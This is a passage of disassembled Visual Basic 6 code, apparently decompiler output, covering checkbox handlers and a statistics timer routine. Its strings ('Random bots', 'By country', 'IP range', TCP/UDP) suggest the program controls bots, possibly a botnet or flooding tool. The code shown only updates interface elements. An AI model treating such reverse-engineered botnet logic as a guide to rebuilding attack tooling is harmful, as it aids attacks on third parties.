007EED28: mov var_60, 00000002h
007EED2F: and var_68, 00000000h
007EED33: mov var_70, 00000002h
007EED3A: lea eax, var_50
007EED3D: push eax
007EED3E: lea eax, var_60
007EED41: push eax
007EED42: lea eax, var_70
007EED45: push eax
007EED46: lea eax, var_0000009C
007EED4C: push eax
007EED4D: lea eax, var_0000008C
007EED53: push eax
007EED54: lea eax, var_24
007EED57: push eax
007EED58: call 00410A3Ch ; For
007EED5D: mov var_000000A8, eax
007EED63: lea ecx, var_28
007EED66: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EED6B: jmp 007EEE75h
007EED70: push 00000000h
007EED72: push 00000000h
007EED74: mov eax, [ebp+08h]
007EED77: mov eax, [eax]
007EED79: push [ebp+08h]
007EED7C: call [eax+00000368h]
007EED82: push eax
007EED83: lea eax, var_28
007EED86: push eax
007EED87: call 00410A84h ; Set (object)
007EED8C: push eax
007EED8D: lea eax, var_40
007EED90: push eax
007EED91: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007EED96: add esp, 00000010h
007EED99: push eax
007EED9A: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007EED9F: neg eax
007EEDA1: sbb eax, eax
007EEDA3: neg eax
007EEDA5: neg eax
007EEDA7: mov var_48, ax
007EEDAB: mov var_50, 0000000Bh
007EEDB2: mov eax, [ebp+08h]
007EEDB5: mov eax, [eax]
007EEDB7: push [ebp+08h]
007EEDBA: call [eax+00000364h]
007EEDC0: push eax
007EEDC1: lea eax, var_2C
007EEDC4: push eax
007EEDC5: call 00410A84h ; Set (object)
007EEDCA: mov var_78, eax
007EEDCD: lea eax, var_30
007EEDD0: push eax
007EEDD1: lea eax, var_24
007EEDD4: push eax
007EEDD5: call 004109D0h ; msvbvm60.dll.__vbaI2Var
007EEDDA: push eax
007EEDDB: mov eax, var_78
007EEDDE: mov eax, [eax]
007EEDE0: push var_78
007EEDE3: call [eax+40h]
007EEDE6: fclex 
007EEDE8: mov var_7C, eax
007EEDEB: cmp var_7C, 00000000h
007EEDEF: jnl 7EEE0Bh
007EEDF1: push 00000040h
007EEDF3: push 00440DE8h
007EEDF8: push var_78
007EEDFB: push var_7C
007EEDFE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EEE03: mov var_000000BC, eax
007EEE09: jmp 7EEE12h
007EEE0B: and var_000000BC, 00000000h
007EEE12: push 00000010h
007EEE14: pop eax
007EEE15: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007EEE1A: lea esi, var_50
007EEE1D: mov edi, esp
007EEE1F: movsd 
007EEE20: movsd 
007EEE21: movsd 
007EEE22: movsd 
007EEE23: push 8001000Dh
007EEE28: push var_30
007EEE2B: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
007EEE30: lea eax, var_30
007EEE33: push eax
007EEE34: lea eax, var_2C
007EEE37: push eax
007EEE38: lea eax, var_28
007EEE3B: push eax
007EEE3C: push 00000003h
007EEE3E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EEE43: add esp, 00000010h
007EEE46: lea eax, var_50
007EEE49: push eax
007EEE4A: lea eax, var_40
007EEE4D: push eax
007EEE4E: push 00000002h
007EEE50: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007EEE55: add esp, 0000000Ch
007EEE58: lea eax, var_0000009C
007EEE5E: push eax
007EEE5F: lea eax, var_0000008C
007EEE65: push eax
007EEE66: lea eax, var_24
007EEE69: push eax
007EEE6A: call 00410A36h ; Next
007EEE6F: mov var_000000A8, eax
007EEE75: cmp var_000000A8, 00000000h
007EEE7C: jnz 007EED70h
007EEE82: mov var_04, 00000000h
007EEE89: push 007EEED0h
007EEE8E: jmp 7EEEAFh
007EEE90: lea eax, var_30
007EEE93: push eax
007EEE94: lea eax, var_2C
007EEE97: push eax
007EEE98: lea eax, var_28
007EEE9B: push eax
007EEE9C: push 00000003h
007EEE9E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EEEA3: add esp, 00000010h
007EEEA6: lea ecx, var_40
007EEEA9: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EEEAE: ret 
End Sub

Private sub chkSelAll__7EF0D5
007EF0D5: push ebp
007EF0D6: mov ebp, esp
007EF0D8: sub esp, 0000000Ch
007EF0DB: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
007EF0E0: mov eax, fs:[00h]
007EF0E6: push eax
007EF0E7: mov fs:[00000000h], esp
007EF0EE: push 0000002Ch
007EF0F0: pop eax
007EF0F1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007EF0F6: push ebx
007EF0F7: push esi
007EF0F8: push edi
007EF0F9: mov var_0C, esp
007EF0FC: mov var_08, 00409C78h
007EF103: mov eax, [ebp+08h]
007EF106: and eax, 00000001h
007EF109: mov var_04, eax
007EF10C: mov eax, [ebp+08h]
007EF10F: and al, FEh
007EF111: mov [ebp+08h], eax
007EF114: mov eax, [ebp+08h]
007EF117: mov eax, [eax]
007EF119: push [ebp+08h]
007EF11C: call [eax+04h]
007EF11F: mov eax, [ebp+08h]
007EF122: mov eax, [eax]
007EF124: push [ebp+08h]
007EF127: call [eax+00000300h]
007EF12D: push eax
007EF12E: lea eax, var_1C
007EF131: push eax
007EF132: call 00410A84h ; Set (object)
007EF137: mov var_30, eax
007EF13A: push 00000000h
007EF13C: push 00000000h
007EF13E: mov eax, [ebp+08h]
007EF141: mov eax, [eax]
007EF143: push [ebp+08h]
007EF146: call [eax+0000036Ch]
007EF14C: push eax
007EF14D: lea eax, var_18
007EF150: push eax
007EF151: call 00410A84h ; Set (object)
007EF156: push eax
007EF157: lea eax, var_2C
007EF15A: push eax
007EF15B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007EF160: add esp, 00000010h
007EF163: push eax
007EF164: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007EF169: neg eax
007EF16B: sbb eax, eax
007EF16D: neg eax
007EF16F: neg eax
007EF171: not ax
007EF174: push eax
007EF175: mov eax, var_30
007EF178: mov eax, [eax]
007EF17A: push var_30
007EF17D: call [eax+0000008Ch]
007EF183: fclex 
007EF185: mov var_34, eax
007EF188: cmp var_34, 00000000h
007EF18C: jnl 7EF1A8h
007EF18E: push 0000008Ch
007EF193: push 00440E08h
007EF198: push var_30
007EF19B: push var_34
007EF19E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF1A3: mov var_40, eax
007EF1A6: jmp 7EF1ACh
007EF1A8: and var_40, 00000000h
007EF1AC: lea eax, var_1C
007EF1AF: push eax
007EF1B0: lea eax, var_18
007EF1B3: push eax
007EF1B4: push 00000002h
007EF1B6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EF1BB: add esp, 0000000Ch
007EF1BE: lea ecx, var_2C
007EF1C1: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EF1C6: mov var_04, 00000000h
007EF1CD: push 007EF1F0h
007EF1D2: jmp 7EF1EFh
007EF1D4: lea eax, var_1C
007EF1D7: push eax
007EF1D8: lea eax, var_18
007EF1DB: push eax
007EF1DC: push 00000002h
007EF1DE: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007EF1E3: add esp, 0000000Ch
007EF1E6: lea ecx, var_2C
007EF1E9: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EF1EE: ret 
End Sub

Private sub chkData__7EEEEF
007EEEEF: push ebp
007EEEF0: mov ebp, esp
007EEEF2: sub esp, 0000000Ch
007EEEF5: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
007EEEFA: mov eax, fs:[00h]
007EEF00: push eax
007EEF01: mov fs:[00000000h], esp
007EEF08: push 0000002Ch
007EEF0A: pop eax
007EEF0B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007EEF10: push ebx
007EEF11: push esi
007EEF12: push edi
007EEF13: mov var_0C, esp
007EEF16: mov var_08, 00409C68h
007EEF1D: mov eax, [ebp+08h]
007EEF20: and eax, 00000001h
007EEF23: mov var_04, eax
007EEF26: mov eax, [ebp+08h]
007EEF29: and al, FEh
007EEF2B: mov [ebp+08h], eax
007EEF2E: mov eax, [ebp+08h]
007EEF31: mov eax, [eax]
007EEF33: push [ebp+08h]
007EEF36: call [eax+04h]
007EEF39: push 00000000h
007EEF3B: push 00000000h
007EEF3D: mov eax, [ebp+08h]
007EEF40: mov eax, [eax]
007EEF42: push [ebp+08h]
007EEF45: call [eax+00000384h]
007EEF4B: push eax
007EEF4C: lea eax, var_18
007EEF4F: push eax
007EEF50: call 00410A84h ; Set (object)
007EEF55: push eax
007EEF56: lea eax, var_28
007EEF59: push eax
007EEF5A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007EEF5F: add esp, 00000010h
007EEF62: push eax
007EEF63: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007EEF68: dec eax
007EEF69: neg eax
007EEF6B: sbb eax, eax
007EEF6D: inc eax
007EEF6E: neg eax
007EEF70: mov var_2C, ax
007EEF74: lea ecx, var_18
007EEF77: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EEF7C: lea ecx, var_28
007EEF7F: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EEF84: movsx eax, word ptr var_2C
007EEF88: test eax, eax
007EEF8A: jz 7EEFE8h
007EEF8C: mov eax, [ebp+08h]
007EEF8F: mov eax, [eax]
007EEF91: push [ebp+08h]
007EEF94: call [eax+00000338h]
007EEF9A: push eax
007EEF9B: lea eax, var_18
007EEF9E: push eax
007EEF9F: call 00410A84h ; Set (object)
007EEFA4: mov var_2C, eax
007EEFA7: push 00000000h
007EEFA9: mov eax, var_2C
007EEFAC: mov eax, [eax]
007EEFAE: push var_2C
007EEFB1: call [eax+0000008Ch]
007EEFB7: fclex 
007EEFB9: mov var_30, eax
007EEFBC: cmp var_30, 00000000h
007EEFC0: jnl 7EEFDCh
007EEFC2: push 0000008Ch
007EEFC7: push 00440E08h
007EEFCC: push var_2C
007EEFCF: push var_30
007EEFD2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EEFD7: mov var_3C, eax
007EEFDA: jmp 7EEFE0h
007EEFDC: and var_3C, 00000000h
007EEFE0: lea ecx, var_18
007EEFE3: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EEFE8: push 00000000h
007EEFEA: push 00000000h
007EEFEC: mov eax, [ebp+08h]
007EEFEF: mov eax, [eax]
007EEFF1: push [ebp+08h]
007EEFF4: call [eax+00000384h]
007EEFFA: push eax
007EEFFB: lea eax, var_18
007EEFFE: push eax
007EEFFF: call 00410A84h ; Set (object)
007EF004: push eax
007EF005: lea eax, var_28
007EF008: push eax
007EF009: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007EF00E: add esp, 00000010h
007EF011: push eax
007EF012: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007EF017: neg eax
007EF019: sbb eax, eax
007EF01B: inc eax
007EF01C: neg eax
007EF01E: mov var_2C, ax
007EF022: lea ecx, var_18
007EF025: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EF02A: lea ecx, var_28
007EF02D: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EF032: movsx eax, word ptr var_2C
007EF036: test eax, eax
007EF038: jz 7EF096h
007EF03A: mov eax, [ebp+08h]
007EF03D: mov eax, [eax]
007EF03F: push [ebp+08h]
007EF042: call [eax+00000338h]
007EF048: push eax
007EF049: lea eax, var_18
007EF04C: push eax
007EF04D: call 00410A84h ; Set (object)
007EF052: mov var_2C, eax
007EF055: push FFFFFFFFh
007EF057: mov eax, var_2C
007EF05A: mov eax, [eax]
007EF05C: push var_2C
007EF05F: call [eax+0000008Ch]
007EF065: fclex 
007EF067: mov var_30, eax
007EF06A: cmp var_30, 00000000h
007EF06E: jnl 7EF08Ah
007EF070: push 0000008Ch
007EF075: push 00440E08h
007EF07A: push var_2C
007EF07D: push var_30
007EF080: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007EF085: mov var_40, eax
007EF088: jmp 7EF08Eh
007EF08A: and var_40, 00000000h
007EF08E: lea ecx, var_18
007EF091: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EF096: mov var_04, 00000000h
007EF09D: push 007EF0B6h
007EF0A2: jmp 7EF0B5h
007EF0A4: lea ecx, var_18
007EF0A7: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007EF0AC: lea ecx, var_28
007EF0AF: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007EF0B4: ret 
End Sub

Private sub tmrStats__7F8AA0
007F8AA0: push ebp
007F8AA1: mov ebp, esp
007F8AA3: sub esp, 0000000Ch
007F8AA6: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
007F8AAB: mov eax, fs:[00h]
007F8AB1: push eax
007F8AB2: mov fs:[00000000h], esp
007F8AB9: mov eax, 000000C0h
007F8ABE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F8AC3: push ebx
007F8AC4: push esi
007F8AC5: push edi
007F8AC6: mov var_0C, esp
007F8AC9: mov var_08, 0040A0D0h
007F8AD0: mov eax, [ebp+08h]
007F8AD3: and eax, 00000001h
007F8AD6: mov var_04, eax
007F8AD9: mov eax, [ebp+08h]
007F8ADC: and al, FEh
007F8ADE: mov [ebp+08h], eax
007F8AE1: mov eax, [ebp+08h]
007F8AE4: mov eax, [eax]
007F8AE6: push [ebp+08h]
007F8AE9: call [eax+04h]
007F8AEC: mov edx, [008F2488h]
007F8AF2: lea ecx, var_2C
007F8AF5: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8AFA: mov edx, [008F248Ch]
007F8B00: lea ecx, var_38
007F8B03: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8B08: mov edx, [008F249Ch]
007F8B0E: lea ecx, var_34
007F8B11: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8B16: mov edx, [008F24A8h]
007F8B1C: lea ecx, var_28
007F8B1F: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8B24: cmp word ptr [008F24A4h], FFFFh
007F8B2C: jnz 7F8B3Bh
007F8B2E: mov edx, 0044F664h ; TCP
007F8B33: lea ecx, var_3C
007F8B36: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8B3B: movsx eax, word ptr [8F24A4h]
007F8B42: test eax, eax
007F8B44: jnz 7F8B53h
007F8B46: mov edx, 0044E754h ; UDP
007F8B4B: lea ecx, var_3C
007F8B4E: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8B53: mov eax, [8F2484h]
007F8B58: mov var_00000088, eax
007F8B5E: mov eax, var_00000088
007F8B64: mov var_00000094, eax
007F8B6A: cmp var_00000094, FFFFFFFFh
007F8B71: jz 7F8BA0h
007F8B73: cmp var_00000094, 00000000h
007F8B7A: jz 7F8BB2h
007F8B7C: cmp var_00000094, 00000001h
007F8B83: jz 7F8BE6h
007F8B85: cmp var_00000094, 00000002h
007F8B8C: jz 7F8C02h
007F8B8E: cmp var_00000094, 00000003h
007F8B95: jz 007F8C1Eh
007F8B9B: jmp 007F8C55h
007F8BA0: mov edx, 00450E84h ; Not customized
007F8BA5: lea ecx, var_30
007F8BA8: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8BAD: jmp 007F8D48h
007F8BB2: push 00451270h ; Random bots -
007F8BB7: push [008F2480h]
007F8BBD: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
007F8BC2: mov edx, eax
007F8BC4: lea ecx, var_40
007F8BC7: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8BCC: push eax
007F8BCD: call 00410A18h ; &
007F8BD2: mov edx, eax
007F8BD4: lea ecx, var_30
007F8BD7: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8BDC: lea ecx, var_40
007F8BDF: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F8BE4: jmp 7F8C55h
007F8BE6: push 00451464h ; By country -
007F8BEB: push [008F2490h]
007F8BF1: call 00410A18h ; &
007F8BF6: mov edx, eax
007F8BF8: lea ecx, var_30
007F8BFB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8C00: jmp 7F8C55h
007F8C02: push 00451068h ; IP range -
007F8C07: push [008F2494h]
007F8C0D: call 00410A18h ; &
007F8C12: mov edx, eax
007F8C14: lea ecx, var_30
007F8C17: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8C1C: jmp 7F8C55h
007F8C1E: push 00451084h ; Ping - Max
007F8C23: push [008F2498h]
007F8C29: call 00410A18h ; &
007F8C2E: mov edx, eax
007F8C30: lea ecx, var_40
007F8C33: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8C38: push eax
007F8C39: push 00450EA8h ; ms
007F8C3E: call 00410A18h ; &
007F8C43: mov edx, eax
007F8C45: lea ecx, var_30
007F8C48: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8C4D: lea ecx, var_40
007F8C50: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F8C55: cmp [008F2410h], 00000000h
007F8C5C: jnz 7F8C79h
007F8C5E: push 008F2410h
007F8C63: push 00440E38h
007F8C68: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F8C6D: mov var_00000098, 008F2410h
007F8C77: jmp 7F8C83h
007F8C79: mov var_00000098, 008F2410h
007F8C83: mov eax, var_00000098
007F8C89: mov eax, [eax]
007F8C8B: mov var_78, eax
007F8C8E: lea eax, var_74
007F8C91: push eax
007F8C92: mov eax, var_78
007F8C95: mov eax, [eax]
007F8C97: push var_78
007F8C9A: call [eax+24h]
007F8C9D: fclex 
007F8C9F: mov var_7C, eax
007F8CA2: cmp var_7C, 00000000h
007F8CA6: jnl 7F8CC2h
007F8CA8: push 00000024h
007F8CAA: push 00440E28h
007F8CAF: push var_78
007F8CB2: push var_7C
007F8CB5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F8CBA: mov var_0000009C, eax
007F8CC0: jmp 7F8CC9h
007F8CC2: and var_0000009C, 00000000h
007F8CC9: push var_74
007F8CCC: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
007F8CD1: mov edx, eax
007F8CD3: lea ecx, var_40
007F8CD6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8CDB: push eax
007F8CDC: push 00450C28h ; of
007F8CE1: call 00410A18h ; &
007F8CE6: mov edx, eax
007F8CE8: lea ecx, var_44
007F8CEB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8CF0: push eax
007F8CF1: push [008F2480h]
007F8CF7: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
007F8CFC: mov edx, eax
007F8CFE: lea ecx, var_48
007F8D01: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F8D06: push eax
007F8D07: call 00410A18h ; &
007F8D0C: mov var_58, eax
007F8D0F: mov var_60, 00000008h
007F8D16: lea edx, var_60
007F8D19: lea ecx, var_24
007F8D1C: call 00410922h ; msvbvm60.dll.__vbaVarMove
007F8D21: lea eax, var_48
007F8D24: push eax
007F8D25: lea eax, var_44
007F8D28: push eax
007F8D29: lea eax, var_40
007F8D2C: push eax
007F8D2D: push 00000003h
007F8D2F: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F8D34: add esp, 00000010h
007F8D37: push [008F2488h]
007F8D3D: push 00000000h
007F8D3F: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
007F8D44: test eax, eax
007F8D46: jnz 7F8DAFh
007F8D48: mov edx, 00441194h ; N/A
007F8D4D: lea ecx, var_2C
007F8D50: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8D55: mov edx, 00441194h ; N/A
007F8D5A: lea ecx, var_38
007F8D5D: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8D62: mov edx, 00441194h ; N/A
007F8D67: lea ecx, var_3C
007F8D6A: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8D6F: mov edx, 00441194h ; N/A
007F8D74: lea ecx, var_34
007F8D77: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8D7C: mov edx, 00441194h ; N/A
007F8D81: lea ecx, var_30
007F8D84: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8D89: mov edx, 00441194h ; N/A
007F8D8E: lea ecx, var_28
007F8D91: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F8D96: mov var_68, 00441194h ; N/A
007F8D9D: mov var_70, 00000008h
007F8DA4: lea edx, var_70
007F8DA7: lea ecx, var_24
007F8DAA: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F8DAF: mov eax, [ebp+08h]
007F8DB2: mov eax, [eax]
007F8DB4: push [ebp+08h]
007F8DB7: call [eax+00000348h]
007F8DBD: push eax
007F8DBE: lea eax, var_4C
007F8DC1: push eax
007F8DC2: call 00410A84h ; Set (object)
007F8DC7: mov var_78, eax
007F8DCA: lea eax, var_50
007F8DCD: push eax
007F8DCE: push 00000000h
007F8DD0: mov eax, var_78
007F8DD3: mov eax, [eax]
007F8DD5: push var_78
007F8DD8: call [eax+40h]
007F8DDB: fclex 
007F8DDD: mov var_7C, eax
007F8DE0: cmp var_7C, 00000000h
007F8DE4: jnl 7F8E00h
007F8DE6: push 00000040h
007F8DE8: push 00440DE8h
007F8DED: push var_78
007F8DF0: push var_7C
007F8DF3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F8DF8: mov var_000000A0, eax
007F8DFE: jmp 7F8E07h
007F8E00: and var_000000A0, 00000000h
007F8E07: mov eax, var_50
007F8E0A: mov var_80, eax
007F8E0D: push var_2C
007F8E10: mov eax, var_80
007F8E13: mov eax, [eax]
007F8E15: push var_80
007F8E18: call [eax+54h]
007F8E1B: fclex 
007F8E1D: mov var_00000084, eax
007F8E23: cmp var_00000084, 00000000h
007F8E2A: jnl 7F8E49h
007F8E2C: push 00000054h
007F8E2E: push 004425E4h
007F8E33: push var_80
007F8E36: push var_00000084
007F8E3C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F8E41: mov var_000000A4, eax
007F8E47: jmp 7F8E50h
007F8E49: and var_000000A4, 00000000h
007F8E50: lea eax, var_50
007F8E53: push eax
007F8E54: lea eax, var_4C
007F8E57: push eax
007F8E58: push 00000002h
007F8E5A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F8E5F: add esp, 0000000Ch
007F8E62: mov eax, [ebp+08h]
007F8E65: mov eax, [eax]
007F8E67: push [ebp+08h]
007F8E6A: call [eax+00000348h]
007F8E70: push eax
007F8E71: lea eax, var_4C
007F8E74: push eax
007F8E75: call 00410A84h ; Set (object)
007F8E7A: mov var_78, eax
007F8E7D: lea eax, var_50
007F8E80: push eax
007F8E81: push 00000001h
007F8E83: mov eax, var_78
007F8E86: mov eax, [eax]
007F8E88: push var_78
007F8E8B: call [eax+40h]
007F8E8E: fclex 
007F8E90: mov var_7C, eax
007F8E93: cmp var_7C, 00000000h
007F8E97: jnl 7F8EB3h
007F8E99: push 00000040h
007F8E9B: push 00440DE8h
007F8EA0: push var_78
007F8EA3: push var_7C
007F8EA6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F8EAB: mov var_000000A8, eax
007F8EB1: jmp 7F8EBAh
007F8EB3: and var_000000A8, 00000000h
007F8EBA: mov eax, var_50
007F8EBD: mov var_80, eax
007F8EC0: push var_38
007F8EC3: mov eax, var_80
007F8EC6: mov eax, [eax]
007F8EC8: push var_80
007F8ECB: call [eax+54h]
007F8ECE: fclex 
007F8ED0: mov var_00000084, eax
007F8ED6: cmp var_00000084, 00000000h
007F8EDD: jnl 7F8EFCh
007F8EDF: push 00000054h
007F8EE1: push 004425E4h
007F8EE6: push var_80
007F8EE9: push var_00000084
007F8EEF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F8EF4: mov var_000000AC, eax
007F8EFA: jmp 7F8F03h
007F8EFC: and var_000000AC, 00000000h
007F8F03: lea eax, var_50
007F8F06: push eax
007F8F07: lea eax, var_4C
007F8F0A: push eax
007F8F0B: push 00000002h
007F8F0D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F8F12: add esp, 0000000Ch
007F8F15: mov eax, [ebp+08h]
007F8F18: mov eax, [eax]
007F8F1A: push [ebp+08h]
007F8F1D: call [eax+00000348h]
007F8F23: push eax
007F8F24: lea eax, var_4C
007F8F27: push eax
007F8F28: call 00410A84h ; Set (object)
007F8F2D: mov var_78, eax
007F8F30: lea eax, var_50
007F8F33: push eax
007F8F34: push 00000002h
007F8F36: mov eax, var_78
007F8F39: mov eax, [eax]
007F8F3B: push var_78
007F8F3E: call [eax+40h]
007F8F41: fclex 
007F8F43: mov var_7C, eax
007F8F46: cmp var_7C, 00000000h
007F8F4A: jnl 7F8F66h
007F8F4C: push 00000040h
007F8F4E: push 00440DE8h
007F8F53: push var_78
007F8F56: push var_7C
007F8F59: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F8F5E: mov var_000000B0, eax
007F8F64: jmp 7F8F6Dh
007F8F66: and var_000000B0, 00000000h
007F8F6D: mov eax, var_50
007F8F70: mov var_80, eax
007F8F73: push var_3C
007F8F76: mov eax, var_80
007F8F79: mov eax, [eax]
007F8F7B: push var_80
007F8F7E: call [eax+54h]
007F8F81: fclex 
007F8F83: mov var_00000084, eax
007F8F89: cmp var_00000084, 00000000h
007F8F90: jnl 7F8FAFh
007F8F92: push 00000054h
007F8F94: push 004425E4h
007F8F99: push var_80
007F8F9C: push var_00000084
007F8FA2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F8FA7: mov var_000000B4, eax
007F8FAD: jmp 7F8FB6h
007F8FAF: and var_000000B4, 00000000h
007F8FB6: lea eax, var_50
007F8FB9: push eax
007F8FBA: lea eax, var_4C
007F8FBD: push eax
007F8FBE: push 00000002h
007F8FC0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F8FC5: add esp, 0000000Ch
007F8FC8: mov eax, [ebp+08h]
007F8FCB: mov eax, [eax]
007F8FCD: push [ebp+08h]
007F8FD0: call [eax+00000348h]
007F8FD6: push eax
007F8FD7: lea eax, var_4C
007F8FDA: push eax
007F8FDB: call 00410A84h ; Set (object)
007F8FE0: mov var_78, eax
007F8FE3: lea eax, var_50
007F8FE6: push eax
007F8FE7: push 00000003h
007F8FE9: mov eax, var_78
007F8FEC: mov eax, [eax]
007F8FEE: push var_78
007F8FF1: call [eax+40h]
007F8FF4: fclex 
007F8FF6: mov var_7C, eax
007F8FF9: cmp var_7C, 00000000h
007F8FFD: jnl 7F9019h
007F8FFF: push 00000040h
007F9001: push 00440DE8h
007F9006: push var_78
007F9009: push var_7C
007F900C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F9011: mov var_000000B8, eax
007F9017: jmp 7F9020h
007F9019: and var_000000B8, 00000000h
007F9020: mov eax, var_50
007F9023: mov var_80, eax
007F9026: push var_34
007F9029: mov eax, var_80
007F902C: mov eax, [eax]
007F902E: push var_80
007F9031: call [eax+54h]
007F9034: fclex 
007F9036: mov var_00000084, eax
007F903C: cmp var_00000084, 00000000h
007F9043: jnl 7F9062h
007F9045: push 00000054h
007F9047: push 004425E4h
007F904C: push var_80
007F904F: push var_00000084
007F9055: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F905A: mov var_000000BC, eax
007F9060: jmp 7F9069h
007F9062: and var_000000BC, 00000000h
007F9069: lea eax, var_50
007F906C: push eax
007F906D: lea eax, var_4C
007F9070: push eax
007F9071: push 00000002h
007F9073: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F9078: add esp, 0000000Ch
007F907B: mov eax, [ebp+08h]
007F907E: mov eax, [eax]
007F9080: push [ebp+08h]
007F9083: call [eax+00000348h]
007F9089: push eax
007F908A: lea eax, var_4C
007F908D: push eax
007F908E: call 00410A84h ; Set (object)
007F9093: mov var_78, eax
007F9096: lea eax, var_50
007F9099: push eax
007F909A: push 00000004h
007F909C: mov eax, var_78
007F909F: mov eax, [eax]
007F90A1: push var_78
007F90A4: call [eax+40h]
007F90A7: fclex 
007F90A9: mov var_7C, eax
007F90AC: cmp var_7C, 00000000h
007F90B0: jnl 7F90CCh
007F90B2: push 00000040h
007F90B4: push 00440DE8h
007F90B9: push var_78
007F90BC: push var_7C
007F90BF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F90C4: mov var_000000C0, eax
007F90CA: jmp 7F90D3h
007F90CC: and var_000000C0, 00000000h
007F90D3: mov eax, var_50
007F90D6: mov var_80, eax
007F90D9: push var_28
007F90DC: mov eax, var_80
007F90DF: mov eax, [eax]
007F90E1: push var_80
007F90E4: call [eax+54h]
007F90E7: fclex 
007F90E9: mov var_00000084, eax
007F90EF: cmp var_00000084, 00000000h
007F90F6: jnl 7F9115h
007F90F8: push 00000054h
007F90FA: push 004425E4h
007F90FF: push var_80
007F9102: push var_00000084
007F9108: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F910D: mov var_000000C4, eax
007F9113: jmp 7F911Ch
007F9115: and var_000000C4, 00000000h
007F911C: lea eax, var_50
007F911F: push eax
007F9120: lea eax, var_4C
007F9123: push eax
007F9124: push 00000002h
007F9126: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F912B: add esp, 0000000Ch
007F912E: mov eax, [ebp+08h]
007F9131: mov eax, [eax]
007F9133: push [ebp+08h]
007F9136: call [eax+00000348h]
007F913C: push eax
007F913D: lea eax, var_4C
007F9140: push eax
007F9141: call 00410A84h ; Set (object)
007F9146: mov var_78, eax
007F9149: lea eax, var_50
007F914C: push eax
